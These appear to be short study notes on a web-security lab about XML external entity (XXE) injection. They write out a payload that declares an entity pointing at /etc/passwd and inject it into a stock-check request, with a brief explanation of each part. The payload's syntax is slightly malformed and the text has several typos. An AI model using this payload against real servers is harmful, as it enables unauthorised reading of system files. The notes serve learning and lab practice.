Exploiting XXE using external entities to retrieve files:
    
    -The topic of this challenge comes under XML Xeternal Entity
    -Here we retrive the file passwd via XXE injection by changing DOCTYPE
    -<!DOCTYPE foo [ <! ENTITY xxe system "file:///etc/passwd">]>
     <stockCheck><productId>&xxe;</productId></stockCheck>
    -<!DOCTYPE foo --> This is the statrt of Document type definition(DTD).DTD defines the structure of the document can contain
    -[ <! ENTITY xxe system "file:///etc/passwd">] --> It defines the XML external entity
